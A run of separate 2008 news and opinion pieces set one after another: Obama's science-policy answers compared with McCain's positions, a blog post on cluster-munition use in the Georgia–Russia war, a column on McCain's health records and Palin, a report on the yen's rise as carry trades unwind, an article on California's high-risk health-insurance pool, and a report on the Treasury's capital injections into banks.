• Strengthen the role of the President 's Council of Advisors on Science and Technology ( PCAST ) by appointing experts who are charged to provide independent advice on critical issues in science and technology .
The PCAST will once again be advisory to the president ; and
• Restore the science integrity of government and restore transparency of decision - making by issuing an Executive Order establishing clear guidelines for the review and release of government publications , guaranteeing that results are released in a timely manner and not distorted by the ideological biases of political appointees .
I will strengthen protection for ' whistle blowers ' who report abuses of these processes .
McCain has similarly pledged to fill key technical positions in his administration with qualified scientists and engineers , including having a science adviser working directly with the president .
" McCain will seek to restore the credibility of scientific research " in the federal government , says campaign adviser Floyd DesChamps .
McCain has argued that taxpayers ' investment in scientific research should be repaid with the untarnished results of that work .
What role does nuclear power have in your vision for the US energy supply , and how would you address the problem of nuclear waste ?
E. SCHNAKENBERG / GETTY
Obama : Nuclear power represents an important part of our current energy mix .
Nuclear also represents 70 % of our non-carbon generated electricity .
It is unlikely that we can meet our aggressive climate goals if we eliminate nuclear power as an option .
However , before an expansion of nuclear power is considered , key issues must be addressed , including security of nuclear fuel and waste , waste storage and proliferation .
The nuclear waste disposal efforts at Yucca Mountain [ in Nevada ] have been an expensive failure and should be abandoned .
I will work with the industry and governors to develop a way to store nuclear waste safely while we pursue long - term solutions .
McCain has proposed building 45 new nuclear power plants by 2030 , with an eventual goal of a total of 100 .
McCain has not addressed where the nuclear waste from these and current reactors would go , and he has supported the Yucca Mountain storage project in the past .
You support a cap - and - trade system for regulating greenhouse - gas emissions ; what lessons from the European emissions - trading system would you implement ?
L. LEFKOWITZ / GETTY
Obama : I will implement a market - based cap - and - trade system to reduce carbon emissions by the amount scientists say is necessary : 80 % below 1990 levels by 2050 .
While Europe has had important successes with its system , it also has made mistakes that we should learn from .
Unlike the European system , my plan would aim to cover virtually all greenhouse - gas emissions , would auction off all of the permits instead of giving them away , and would make sure there was stability in the market for permits and their price .
My plan would use the proceeds of the auction for investments in a clean - energy future , habitat protection and rebates and other transition relief for families .
McCain has described his own vision of a cap - and - trade system , but with a different target ; the McCain plan calls for reductions of emissions by 60 % below 1990 levels by 2050 .
McCain would initially give away emissions permits instead of auctioning them .
McCain would also allow emissions allowances to be ' banked ' or ' borrowed ' for different time periods , as well as establish a national ' strategic carbon reserve ' that could release permits during difficult economic times .
He would also allow unlimited offsets , from both domestic and international sources , to ease into a newly set up cap - and - trade system .
Does your stance on tapping domestic oil reserves stand at odds with your goals for reducing national emissions and combating climate change ?
How will you balance the two ?
Obama : With 3 % of the world 's oil reserves , the United States cannot drill its way to energy security .
But US oil and gas production plays an important role in our domestic economy and remains critical to prevent global energy prices from climbing even higher .
There are several key opportunities to support increased US production of oil and gas that do not require opening up currently protected areas .
Increasing domestic oil and gas production in the ways I propose in no way lessens my commitment to combating climate change , one of the great challenges of our time .
I am committed to implementing a market - based cap - and - trade system to reduce carbon emissions 80 % below 1990 levels by 2050 , and I will start reducing emissions immediately by establishing strong annual reduction targets with an intermediate goal of reducing emissions to 1990 levels by 2020 .
McCain currently favours a more aggressive offshore - drilling policy than Obama ; both candidates , like the Democratic - led Congress , have changed their earlier stances opposing such drilling in the face of rising oil prices and public pressure to do something about it .
However , McCain sees climate change as a national security issue , and maintains that it is a major priority for him .
He emphasizes developing new emissions - reducing technologies with minimum costs in order to soften any blow to the national economy .
McCain 's intermediate goal for emission reductions is also 1990 levels by 2020 .
Do you believe that evolution by means of natural selection is a sufficient explanation for the variety and complexity of life on Earth ?
Should intelligent design , or some derivative thereof , be taught in science class in public schools ?
Obama : I believe in evolution , and I support the strong consensus of the scientific community that evolution is scientifically validated .
I do not believe it is helpful to our students to cloud discussions of science with non-scientific theories like intelligent design that are not subject to experimental scrutiny .
McCain said last year , in a Republican primary debate : " I believe in evolution .
But I also believe , when I hike the Grand Canyon and see it at sunset , that the hand of God is there also . "
In 2005 , he told the Arizona Daily Star that he thought " all points of view " should be available to students studying the origins of humanity .
But the next year a Colorado paper reported him saying that such viewpoints should not be taught in science class .
Would you lift President Bush 's ban on federal funding for research on human embryonic stem - cell lines derived after 9 August 2001 ?
Under what conditions do you find it acceptable to create a human embryonic stem - cell line ?
Obama : Stem - cell research holds the promise of improving our lives in at least three ways — by substituting normal cells for damaged cells to treat diabetes , Parkinson 's disease , spinal - cord injury , heart failure and other disorders ; by providing scientists with safe and convenient models of disease for drug development ; and by helping to understand fundamental aspects of normal development and cell dysfunction .
SPL
For these reasons , I strongly support expanding research on stem cells .
I believe that the restrictions that President Bush has placed on the funding of human embryonic stem - cell research have handcuffed our scientists and hindered our ability to compete with other nations .
As president , I will lift the current administration 's ban on federal funding of research on embryonic stem - cell lines created after 9 August 2001 through executive order , and I will ensure that all research on stem cells is conducted ethically and with rigorous oversight .
I recognize that some people object to government support of research that requires cells to be harvested from human embryos .
However , hundreds of thousands of embryos stored in the United States in in vitro fertilization clinics will not be used for reproductive purposes , and will eventually be destroyed .
I believe that it is ethical to use these extra embryos for research that could save lives when they are freely donated for that express purpose .
I am also aware that there have been suggestions that human stem cells of various types , derived from sources other than embryos , make the use of embryonic stem cells unnecessary .
I do n't agree .
While adult stem cells , such as those harvested from blood or bone marrow , are already used for treatment of some diseases , they do not have the versatility of embryonic stem cells and cannot replace them .
Recent discoveries indicate that adult skin cells can be reprogrammed to behave like stem cells ; these are exciting findings that might in the future lead to an alternate source of highly versatile stem cells .
However , embryonic stem cells remain the ' gold standard ' , and studies of all types of stem cells should continue in parallel for the foreseeable future .
Rather than restrict the funding of such research , I favour responsible oversight of it , in accordance with recent reports from the National Research Council ( NRC ) .
Recommendations from the NRC reports are already being followed by institutions that conduct human embryonic stem - cell research with funds from a variety of sources .
An expanded , federally supported stem - cell research programme will encourage talented US scientists to engage in this important new field , will allow more effective oversight , and will signal to other countries our commitment to compete in this exciting area of medical research .
McCain 's stance on embryonic stem - cell research has been the subject of much speculation among researchers .
He has voted twice before to lift President Bush 's funding restrictions on such work , but his running mate Sarah Palin opposes the work .
His public position is perhaps best summarized in his response to questionnaires from advocacy groups such as Research !
America last year and ScienceDebate2008 this year : " While I support federal funding for embryonic stem - cell research , I believe clear lines should be drawn that reflect a refusal to sacrifice moral values and ethical principles for the sake of scientific progress .
Moreover , I believe that recent scientific breakthroughs raise the hope that one day this debate will be rendered academic .
I also support funding for other research programmes , including amniotic fluid and adult stem - cell research which hold much scientific promise and do not involve the use of embryos .
I oppose the intentional creation of human embryos for research purposes and I voted to ban the practice of ' fetal farming ' , making it a federal crime for researchers to use cells or fetal tissue from an embryo created for research purposes . "
Do you see astronauts on the Moon as a worthy goal for the country ?
Obama : I believe that the United States needs a strong space programme to help maintain its superiority not only in space , but also here on earth in the realms of education , science , technology , the environment and national security .
Technology developed for space missions has been applied to improve everything from computers and medical technology to baby formula and automobiles .
As president , I will establish a robust and balanced civilian space programme .
In achieving this vision , I will reach out to include international partners and to engage the private sector to amplify NASA 's reach .
I believe that a revitalized NASA can help America maintain its innovation edge and contribute to American economic growth .
NASA
I will re-establish the National Aeronautics and Space Council , which will coordinate civilian , military , commercial and national security space activities and report to the president .
This council will oversee a comprehensive and integrated strategy and policy dealing with all aspects of the government 's space - related programmes , including those being managed by NASA , the Department of Defense , the National Reconnaissance Office , the Department of Commerce , the Department of Transportation and other federal agencies .
It will solicit public participation , engage the international community and work toward a twenty - first - century vision of space that constantly pushes the envelope on new technologies as it pursues a balanced national portfolio that expands our reach into the heavens and improves life here on Earth .
Human spaceflight is important to America 's political , economic , technological and scientific leadership .
I will support renewed human exploration beyond low Earth orbit .
I endorse the goal of sending human missions to the Moon by 2020 , as a precursor in an orderly progression to missions to more distant destinations , including Mars .
McCain has released an extensive space platform , including calling space exploration a " top priority " for the country and manned space flight " a reflection of national power and pride " .
Unlike Obama , McCain has explicitly committed to funding the Constellation programme to replace the space - shuttle fleet ( although without details on how he would accomplish that ) .
He also says he would maintain the nation 's space infrastructure , including the related workforce , and focus on maximizing the research possibilities of the International Space Station .
He would maintain investments in aeronautics research as well as the infrastructure for Earth - monitoring satellites .

Would it make sense for more overseas students who receive PhDs at American universities to stay in the country and contribute to its research base and its wealth ?
What immigration reforms would you support ?
Obama : I believe that we must enact comprehensive immigration reform to restore our economic strength , relieve local governments of unfair burdens stemming from an inefficient federal immigration system , ensure that our country and borders remain secure and allow a path to citizenship for the 12 million undocumented immigrants who are willing to pay a fine , pay taxes , and learn English .
A critical part of comprehensive immigration reform is turning back misguided policies that since 9/11 have turned away the world 's best and brightest from America .
As president , I will improve our legal permanent resident visa programmes and temporary programmes to attract some of the world 's most talented people to America .
McCain , as a senator from Arizona , has long been involved in immigration issues , mainly through strengthening federal security at land border crossings .
He supports immigration reforms to allow more highly skilled workers to stay and work in the United States after graduation .

Separating fact from fiction is n't easy , in wartime .
Take Human Rights
Watch 's recent " discovery " that Russia used cluster bombs during its Georgia campaign .
Much was made of this by some media types who took it as evidence for a black - and - white situation of evil Russians versus righteous Georgians .
But it turns out the Russians were not the only ones using cluster bombs .
Human Rights
Watch is still sticking by its identification of Russian PTAB submunitions ( pictured ) .
But now , the group has issued a clarification on a second type of munition used in Georgia :
Human Rights
Watch researchers in Shindisi on August 20 found unexploded cluster submunitions , commonly known as Dual - Purpose Improved Conventional Munitions ( DPICMs ) , and initially identified them as Russian .
However , those submunitions were later identified by the Norwegian Defense Research Establishment ( NDRE ) , based on Human Rights Watch ’s photographs , as M85 DPICMs , which have not been reported to be part of Russia ’s arsenal .
The NDRE is a center of expertise on munitions which advises the Norwegian government .
So if the offending bomblets were n't Russia 's , whose were they ?
Not , seemingly , Georgia's :
On August 31 , the government of Georgia informed Human Rights Watch that it had a stockpile of ground rocket - launched cluster munitions that have M85 submunitions .
The Georgian government described them as being a different type of M85 submunition than those found by Human Rights Watch and stated that these were the only cluster munitions in the Georgian arsenal .
The M85 is manufactured by Israel and has a notably high failure rate , leaving dangerous unexploded bomblets , according to anti-mine organization No More Landmines :
In an area in Southern Lebanon 3 sample sites where M85s had been deployed were analysed and , rather than finding a failure rate of less than 1 % , the three sites had failures of 9.6 % , 11.5 % and 12.2 % .
That seemed to be about it , with both Russian and Georgian cluster bombs apparently found but denied .
But the situation changed the next day , as another HRW press release revealed :
The Georgian government said it used cluster munitions during the August 2008 armed conflict with Russia , Human Rights Watch said today .
In a letter to Human Rights Watch , the Georgian Defense Ministry stated that cluster rockets were “ used against Russian military equipment and armament marching from Roki tunnel to Dzara road [ sic ] , ” but that they “ were never used against civilians , civilian targets and civilian populated or nearby areas . ”
Propaganda is an essential part of warfare , and portraying the other side as ruthless and inhumane while denying any wrongdoing by your own side is pretty routine stuff for modern " Information Warriors , " as they like to style themselves .
While the Georgians are admitting to attacks on military targets , they 're not claiming those bomblets found in the village of Shindisi .
Still , that 's one step ahead of the Russians , who , according to HRW , are n’t admitting to using cluster bombs at all .
Thousands of years after it was first noted by an ancient Greek dramatist , truth is still the first casualty of war .
UPDATE : Commenter Helena Cobban challenges the idea that the weapons shown above are Russian , referring to a site that claims :
" The diameter of the object in the photo is only roughly half the 325 mm diameter an RBU - 250 has .
The fin configuration of the debris HRW shows is inconsistent with a gravity bomb , but consistent with a tube launched missile like the ones used in Georgia 's GRADAL system . "
This is not the view of HRW or the NDRE , but clearly the argument is not over yet .

NYT
The second bit of predebate news , percolating under the radar , involved the still - unanswered questions about McCain ’s health .
Back in May , you will recall , the McCain campaign allowed a select group of 20 reporters to spend a mere three hours examining ( but not photocopying ) 1,173 pages of the candidate ’s health records on the Friday of Memorial Day weekend .
Conspicuously uninvited was Lawrence Altman , a doctor who covers medicine for The New York Times .
Altman instead canvassed melanoma experts to evaluate the sketchy data that did emerge .
They found the information too “ unclear ” to determine McCain ’s cancer prognosis .
There was , however , at least one doctor - journalist among those 20 reporters in May , the CNN correspondent Sanjay Gupta .
At the time , Gupta told Katie Couric on CBS that the medical records were “ pretty comprehensive ” and wrote on his CNN blog that he was “ pretty convinced there was no ‘ smoking gun ’ about the senator ’s health . ”
( Physical health , that is ; Gupta wrote there was hardly any information on McCain ’s mental health . )
That was then .
Now McCain is looking increasingly shaky , whether he ’s repeating his “ Miss Congeniality ” joke twice in the same debate or speaking from notecards even when reciting a line for ( literally ) the 17th time ( “ The fundamentals of our economy are strong ” ) or repeatedly confusing proper nouns that begin with S ( Sunni , Shia , Sudan , Somalia , Spain ) .
McCain ’s “ dismaying temperament , ” as George Will labeled it , only thickens the concerns .
His kamikaze mission into Washington during the bailout crisis seemed crazed .
His seething , hostile debate countenance — a replay of Al Gore ’s sarcastic sighing in 2000 — did n’t make the deferential Obama look weak ( as many Democrats feared ) but elevated him into looking like the sole presidential grown - up .
Though CNN and MSNBC would n’t run a political ad with doctors questioning McCain ’s medical status , Gupta revisited the issue in an interview published last Tuesday by The Huffington Post .
While maintaining a pretty upbeat take on the candidate ’s health , the doctor - journalist told the reporter Sam Stein that he could n’t vouch “ by any means ” for the completeness of the records the campaign showed him four months ago .
“ The pages were n’t numbered , ” Gupta said , “ so I had no way of knowing what was missing . ”
At least in Watergate we knew that the gap on Rose Mary Woods ’s tape ran 18 and a half minutes .
It ’s against this backdrop that Palin ’s public pronouncements , culminating with her debate performance , have been so striking .
The standard take has it that she ’s either speaking utter ignorant gibberish ( as to Couric ) or reciting highly polished , campaign - written sound bites that she ’s memorized ( as at the convention and the debate ) .
But there ’s a steady unnerving undertone to Palin ’s utterances , a consistent message of hubristic self - confidence and hyper-ambition .
She wants to be president , she thinks she can be president , she thinks she will be president .
And perhaps soon .
She often sounds like someone who sees herself as half - a- heartbeat away from the presidency .
Or who is seen that way by her own camp , the hard - right G.O.P. base that never liked McCain anyway and views him as , at best , a White House place holder .
The same credit market collapse that drove Lehman Brothers into bankruptcy and sent bank borrowing costs in Europe to record highs is making the yen unbeatable .
Japan 's currency was the best - performer in September and the only currency to appreciate against the US dollar .
Deutsche Bank AG , the biggest trader of foreign exchange , says the yen will rise 5 % in coming months .
New York - based Morgan Stanley is telling clients to buy the currency versus the euro and pound .
After seven years of providing the cheapest source of funds for investors buying higher - yielding New Zealand dollars , Australian dollars and Brazil reais , the yen is appreciating as $ US587 billion ( $ 757 billion ) of subprime mortgage - related losses force banks to restrict credit .
It strengthened 4.4 % on a trade weighted basis in September , according to the Bank of Japan 's effective exchange rate , the most since August 2007 , when the seizure in capital markets began .
The Australian dollar recently traded at 81.5 yen , down from about 104 yen about two months ago .
`` We are in a multi- year trend reversal , '' said Paresh Upadhyaya , a senior vice president at Putnam Investment LLC in Boston who helps manage $ US50 billion in currency assets .
``We are going to see a global central bank easing cycle .
The yen is the place to be in this environment of economic slowdown and heightened volatility . ''
This year will be the first since 2002 that the economies of the US , euro-region and Japan all expand less than 2 % , according to data compiled by Bloomberg .
The BOJ 's effective exchange rate rose 5 % from April through September of that year , the best six - month performance since the end of 1999 .
` Counter - cyclical currency '
Strategists are turning more bullish , forecasting the yen will end the year at 107 to the US dollar , compared with an expectation of 109.15 on Sept. 12 , according to the median of 40 estimates compiled by Bloomberg .
`` The yen is a counter - cyclical currency , '' said Richard Benson , who oversees $ US14 billion of currency funds at Millennium Asset Management in London .
`` When the global economy looks bad , the yen should do well . ''
The currency lost 60 % against the Australian and New Zealand dollars in the seven years ended June 30 , and depreciated 24 % versus the real and 20 % to the British pound .
The main cause was the so - called carry trade , where investors took out loans in
Japan to take advantage of the lowest benchmark interest rates among the Group of 10 industrialized nations .
They then sold the yen and invested the proceeds in high - yielding assets outside the country .
211 % return
Investors who used the strategy to buy the New Zealand and Australian dollars , euro and pound , would have generated a return of 211 % on average in the past seven years , according to data compiled by Bloomberg .
The trades would have lost 13 % this year .
The collapse of Lehman , the government takeovers of Fannie Mae , Freddie Mac , American International Group Inc. and Washington Mutual Inc. and the forced sales of Merrill Lynch & Co. and Wachovia Corp. reduced confidence in the world 's financial system .
That in turn has made banks wary of lending to each other , pushing the three - month London interbank offered rate in dollars to 4.33 % from 2.81 % on Sept. 15 , the day New York - based Lehman filed for bankruptcy protection , according to the British Bankers ' Association in London .
The increase in rates and drop in credit is forcing speculators to close out carry trades and pay back yen - denominated loans .
The currency 's biggest gain the past month has come against the real , rising 20 % .
Lower rates
The slowing world economy is also helping the yen by boosting expectations that central banks will lower borrowing costs .
Policy makers in Europe , Australia , New Zealand and Brazil will cut interest rates next year , according to the median estimates of economists surveyed by Bloomberg .
Futures on the Chicago Board of Trade showed an 84 % probability yesterday the US Federal Reserve will lower its 2 % target rate for overnight lending between banks by a half - percentage point at its Oct. 29 meeting .
Traders saw no chance of a cut a month earlier .
`` The carry trade is dead , '' said Derek Halpenny , European head of global currency research at Bank of Tokyo - Mitsubishi in London .
`` The world is deleveraging . ''
The yen strengthened to 143.99 per euro on Oct. 3 , the highest level since June 2006 , before ending the week at 145.11 .
It gained 0.6 % against the US dollar to 105.32 .
Hedge funds and speculators increased bets that the yen will appreciate versus the dollar to the highest level since July 18 , data from the US Commodity Futures Trading Commission show .
Wagers on an advance in the yen outnumbered those on a drop by 43,022 on Sep. 30 .
As recently as Sept. 2 they were betting on a decline in the yen .
Turning bullish
Morgan Stanley strategists turned bullish last week , saying in an Oct. 2 report to clients thy yen may strengthen to 135 per euro and to 165 per pound from 188.10 .
Frankfurt - based Deutsche Bank expects it to rally to 100 to the US dollar .
Bank of Tokyo- Mitsubishi UFJ Ltd , Japan 's largest bank by market value , raised its forecast last week to 100 per dollar by March from 102 .
It predicts the yen will gain 11 % versus the pound in a year .
Further gains may depend on whether US Treasury Secretary Henry Paulson 's $ US700 billion plan to revive credit markets by purchasing depreciated assets from banks boosts investor confidence .
The carry trade ``is a strategy that has a good track record , '' said Pablo Frei , a money manager at Quaesta Capital in Switzerland , which oversees $ US1.2 billion in currency funds .
`` You have to unwind carry during times of high risk .
There will be a day that it will be put on again .
The question is when . ''
` Structural shift '
Quaesta Capital 's currency funds have reduced the amount of money in carry trades to less than 5 % of assets , from about 30 % a year ago , Frei said .
Investors in Japan will continue to invest internationally to diversify their holdings as risk appetites return , capping the yen 's strength , said Rebecca Patterson , global head of foreign exchange in New York for the private wealth management unit of JPMorgan Chase & Co .
Japanese mutual funds increased purchases of overseas assets to 36.89 trillion yen ( $ 450 billion ) by the end of last year , from 3.06 trillion yen in 2000 , according to Japan 's Investment Trust Association .
`` What 's happened in Japan in the last two , three years has been a structural shift of the Japanese mindset , '' said Patterson .
`` They view these as long term investments .
The yen negative flows will slow in times of trouble like this .
But I do n't see a lot of this is a longer - term shift . ''
Rising volatility
Carry trades became popular as swings in exchange rates fell to record lows because there was less risk that rapid changes would wipe out profits .
Now , that is changing .
Implied volatility on major currencies rose to 16.69 % on Sept. 17 , the highest level since 1998 , according to the JPMorgan G7 Volatility Index .
The gauge of price swings touched 5.76 % in June 2007 , the lowest since the index 's inception in 1992 .
The percentage of currency reserves held in yen by foreign central banks increased for a third straight quarter through June , according to the International Monetary Fund .
Yen now accounts for 3.4 % of global reserves , compared with 2.8 % a year earlier , the lowest amount since at least 1999 .
The dollar is the world 's largest reserve currency at 62.5 % , IMF figures show .
Morgan Stanley strategists said in their Oct. 2 report that the yen may overtake the pound , which is No. 3 at 4.7 % , in ``coming quarters . ''
`` There are many risks in the United States and Europe , '' said Satoshi Okumoto , a general manager at Fukoku Mutual Life Insurance Co. in Tokyo , which has $ US54.1 billion in assets and is Japan 's eighth - biggest life insurance company .
`` Fund managers are starting to shift their money to yen .
They are starting to overweight yen in terms of currency allocation . ''

Dave Dunlap is a Kern County trucker with a failing liver .
Like about 600,000 Californians , he is too sick to qualify for private insurance on the open market .
“ I ’m trying to fight to get a transplant , ” he said .
“ Everyone ’s waiting for me to have a way to pay for it .
I ca n’t even get on the donor list until I have a way to pay for it . ”
California is supposed to have a solution for people like Dunlap .
It is one of 35 states that arranges health coverage for people rejected by commercial companies because they have blemished medical histories .
This group -- known as “ medically uninsurable ” -- accounts for about an eighth of the 5 million Californians who lack health insurance .
Most are self - employed , work for companies that do n’t provide insurance or do n’t have a job .

But California ’s publicly subsidized high - risk pool , long one of the least generous in the country , has atrophied over the tenure of Gov. Arnold Schwarzenegger -- even as the governor put the plight of the uninsured at the top of his political agenda .
Rising premiums and limited subsidies have made the Major Risk Medical Insurance Program either unaffordable , unavailable or ineffective for many of those who most need health insurance .
The program now covers about 13,000 Californians -- about 2 % of the medically uninsurable .
Enrollment has dropped by almost a third since Schwarzenegger became governor .

Schwarzenegger last month vetoed a measure that would have expanded the 17 - year - old pool , overruling the bill ’s endorsement by the pool ’s own governing board , most of whom he appointed .
The governor said “ the only solution for our healthcare crisis ” is a complete overhaul of the state ’s healthcare system along the lines of his $ 14.9 - billion plan that the Legislature rejected last January as too expensive .
“ We supported wholesale health reform , but this is a population that has nowhere else to go , and he ’s leaving them high and dry , ” said Elizabeth Landsberg , legislative advocate for the Western Center on Law & Poverty , a Los Angeles nonprofit .
Subscribers pay two - thirds of the pool ’s cost and the state about one - third .
The insurers that voluntarily participate -- primarily Blue Cross of California and Kaiser Permanente -- break even .

Unlike most other states , which finance their programs either directly with tax dollars or with assessments on insurers , California ’s subsidies have come only from the state ’s tobacco tax .
Lawmakers have kept annual financing at or below $ 40 million a year , requiring the pool ’s administrators to cap its enrollment .
As a result , for much of Schwarzenegger ’s tenure , the pool has had a waiting list of hundreds of people .
This year , Schwarzenegger and legislators provided a one - time allotment of $ 10 million out of fines against insurers to expand the pool ’s enrollment to 915 more people , including all those on the waiting list .
Even with that expansion , the pool will assist half the number enrolled at the program ’s apex in 1999 .

One of the major obstacles is the cost of premiums , which the law sets at 125 % of commercial insurance rates .
More than a third of pool participants who dropped out this year told the pool ’s administrators that they could n’t afford it anymore .
A 55 - year - old Los Angeles County resident with one dependent would have to pay $ 11,240 in premiums and a $ 450 deductible this year for the cheapest plan .
Anne Walzer , a freelance graphic designer in San Francisco who is insured through the pool , said her premiums amount to 14 % of her income .
She said that she was diagnosed with the mildest form of multiple sclerosis .
Even though she has no symptoms and her doctor said the chance of serious sickness was minute , Blue Cross told her she was a “ lifetime denial , ” she said .
“ I ’m healthy , ” said Walzer , 56 , who said she pays $ 600 a month in premiums .
“ I hardly ever go to the doctor .
I do n’t feel I belong in the major risk pool . ”

Despite its cost , California ’s high - risk pool is of limited use for people needing extensive medical care , such as those with cancer or chronic diseases .
That is because the pool ’s benefits are capped at $ 75,000 a year , lower than the limits of any other state ’s pool .
Someone with hemophilia “ would blow through that in a month and a half , ” said Doug Stratton , the outgoing chairman of the National Assn. of State Comprehensive Health Insurance Plans , an association of state high - risk pools .
Only five other states ’ high - risk pools have any annual benefit limits .
Indeed , California ’s cap makes the state ineligible for between $ 4 million and $ 8 million in federal money to help finance the pool , according to a legislative estimate .
About 2.4 million Californians buy health insurance coverage directly rather than through employers .
Insurers have broad discretion to reject applicants .
About 20 % of applicants are rejected because of their health history , said Peter Harbage , a healthcare consultant .

Harbage projected that with fewer employers offering coverage each year , the number of Californians to whom no insurer will sell policies may grow to 1 million by 2010 .
“ There are hundreds of thousands of people in California who ca n’t get coverage because the individual health market is broken , ” Harbage said .
“ You ’re trying to fight a forest fire with a garden hose . ”
Stratton said the most inventive states have found ways to control the costs in their high - risk pools by careful management of chronic ailments .
He said in 2002 , when Indiana arranged to buy drugs for hemophiliacs at the lower prices available to the federal government , the cost of caring for 54 patients with the blood disease dropped from $ 19 million to $ 9 million .
To fix California ’s pool , the Legislature this year proposed placing a $ 1 monthly per customer fee on insurers that sell policies directly to customers .
The money would have allowed the pool to eliminate the annual cap on benefits , lower premiums and increase enrollment .
Advertisement
Cliff Allenby , the chairman of the board that oversees the pool , told Schwarzenegger in a letter that the measure , AB 2 , would “ ameliorate the dysfunction ” in the individual insurance market .
But in his veto message , Schwarzenegger said the fee would be passed on to customers and thus “ only exacerbates their burden . ”
Dave Dunlap ’s problems have grown since he was diagnosed with Hepatitis C in 2003 .
Dunlap , a 54 - year - old from Pine Mountain Club , about 60 miles north of Los Angeles , said the disease weakened him so much that he was in two traffic accidents and had to stop driving his 18 - wheeler .
Cirrhosis caused by the infection is now in the most advanced stage , according his medical records .

His wife , Susan , said his liver has broken down so much that sometimes she can smell the odor of his body discharging toxins through his skin .
“ I suppose in different phases it is controllable , but not when you ’re at the end , ” she said .
“ My husband is dying . ”
She said a liver transplant and a year of drugs to prevent his body from rejecting the new organ would cost more than $ 350,000 .
The Dunlaps said they had never heard of the state ’s high risk pool , but given its premiums and benefit cap , it would be of little use to them .

“ We could n’t afford it anyway , ” Susan Dunlap said .
“ I sell real estate , and obviously real estate is n’t selling . ”

By flooding the U.S. banking system with hundreds of billions of dollars in cheap capital , the government could find itself funding the most dramatic change in the nation ’s financial landscape since the deregulation drive of the 1980s .
That ’s because the Treasury secretary and bank regulators will decide which banks get an infusion of government money , and which will be denied .
Many of the nation ’s 8,400 banks -- especially the smaller and weaker among them -- may be allowed to fail or be swallowed by bigger rivals , industry analysts say .
“ It will hasten consolidation , no doubt about it , ” said Frederick Cannon , chief equity strategist at investment bank Keefe , Bruyette & Woods Inc .
The stock market reflected that fact Tuesday , he said , noting that investors bid up the shares of banks more likely to be helped by the government , while shares of capital - starved institutions considered unlikely to get government funds declined .

The program is also likely to hasten the evolution of the country ’s financial system from a conglomeration of community banks into a network of bigger , interconnected institutions , said Timothy J. Yeager , a former economist for the Federal Reserve Bank of St. Louis and a finance professor at the University of Arkansas .
But not everyone agrees .
Gerard S. Cassidy , managing director of bank equity research at RBC Capital Markets , said he believed the program would help some weaker banks stay in business , because they will be eligible for the same favorable terms the big banks will get for government capital .
“ This plan by the Treasury blurs the lines between the haves and have - nots , ” Cassidy said .
“ The natural course of Darwinian banking has been interrupted by this plan . ”
The program ’s centerpiece is an infusion of $ 250 billion into the banking system through the government ’s purchase of nonvoting preferred shares in financial institutions .

As outlined Tuesday by Treasury Secretary Henry M. Paulson , Federal Reserve Chairman Ben S. Bernanke and Federal Deposit Insurance Corp. Chairwoman Sheila C. Bair , the banks will be required to pay dividends of 5 % a year on the shares -- an attractively low rate for new capital -- rising to 9 % after five years .
The rate jump is designed to provide an incentive for banks to repay the taxpayers before the five - year mark .
The government will also take warrants for each bank it gives capital , which gives it the right to buy stock in the bank later .
The device is aimed at giving taxpayers a chance to profit if the bank ’s stock rises during the period the bank is using the government ’s money .
Banks accepting the federal help will also face constraints on how much they can pay their top executives .
Although the three financial regulators tried to spell out the program in great detail Tuesday , much about it remains murky .
One question is whether individual banking firms will find the government financing attractive .
Advertisement
Cannon contends that the government terms will be hard to resist .
“ This is very inexpensive capital , ” he said .
“ Most boards will say it ’s very appealing , and I think we ’ll see a lot of participation . ”
Treasury officials tried to eliminate any stigma that might attach to the government assistance by announcing huge disbursements of capital to nine top financial firms Tuesday .
Whether they succeeded in removing the stain is open to question .
“ A lot of stronger banks will say , ‘ Thanks but no thanks -- why should I wear that scarlet letter ? ’ ” said Bert Ely , an independent bank consultant in Alexandria , Va .

Some bankers said that other elements of the Treasury ’s rescue plan , including an expansion of FDIC insurance to beyond $ 250,000 for non-interest - bearing accounts ( those used mostly by business customers ) might play a more important role in shoring up confidence in medium - sized and small banks .
“ That will level the playing field , ” said Russell Goldsmith , chief executive of Beverly Hills - based City National Bank , the largest commercial bank in Los Angeles County .
Goldsmith said his management would “ run some numbers ” to decide whether it should apply for the government capital but said his institution was “ well capitalized , and we have n’t been looking for more capital . ”
There is little question that America ’s small banks are struggling to raise cash in a difficult environment , as bank consultant Jeff Rigsby of San Juan Capistrano can attest .

Many of the community banks Rigsby works with have been pressured by regulators over the last year to build up their capital , while others have wanted new funds to expand their business , he said .
Both types of bank have struggled to sell new stock this year as investors have shied away from putting money into a banking business that has fallen under stress .
Stock offerings at existing banks with $ 3 billion or less in assets declined to 41 in the first half of this year , compared with 114 in the same period last year , according to a study by Rigsby ’s Community Bank Ventures .
It is likely that many weaker banks will be refused the assistance , although no one is sure where regulators will draw the line .
Cannon said he expected regulators to use CAMELS ratings -- an acronym for capital adequacy , asset quality , management ability , earnings , liquidity and sensitivity to interest - rate risk .
Banks are graded on each of the six factors , but regulators do not disclose the ranks for particular institutions .
The biggest question about the program is the most crucial : whether it will prompt the assisted institutions to return to the lending market .
Advertisement
Paulson left no doubt Tuesday that unfreezing the credit market was the program ’s chief goal , saying , “ The needs of our economy require that financial institutions not take this new capital to hoard it , but to deploy it . ”
But the secretary ’s authority to mandate such an outcome is almost nonexistent .
“ You ca n’t force a bank to make a loan , ” Cannon said .
“ The leap of faith is that now that they ’ve got the capital , they ’ll go out and lend it . ”
The government ’s hope is that the flow of new capital , combined with other steps it is taking to improve confidence in the banking and credit systems , will trigger more interbank lending first , followed by lending to companies , finally thawing the consumer loan market .

Even with the best intentions , some banks may face obstacles making loans on responsible terms in today ’s deteriorating economy .
“ Our question is whether there ’s enough business out there ” for old - fashioned mortgage loans in which borrowers are willing to fully document their income and make large down payments , said Babette Heimbuch , CEO of FirstFed Financial Corp. of Los Angeles , the parent of savings and loan First Federal Bank of California .
“ Are there enough people who are qualified and are looking for housing ? ” she asked .
“ If you were worried about your job at a manufacturing facility , or in retail , would you go out and buy a house right now ? ”
The capital infusion program represents a dramatic turnaround from the Treasury ’s original financial bailout plan , a complicated program to take bad mortgage loans off the banks ’ books .
That program , which now will take a back seat to the capital injections , was widely seen as favoring big institutions -- investment banks and large commercial banks that played a key role in creating and investing in what proved to be toxic mortgage - backed securities .

The new approach is also more broadly targeted , at least on the surface .
Spokesmen for the Independent Community Bankers of America and the American Bankers Assn. said Tuesday that they had lobbied successfully to ensure that every bank and thrift in the country would be allowed to apply for aid from the government .
Still , by its nature the program is steeply oriented toward large institutions , on whose health the survival of the financial system is highly dependent .
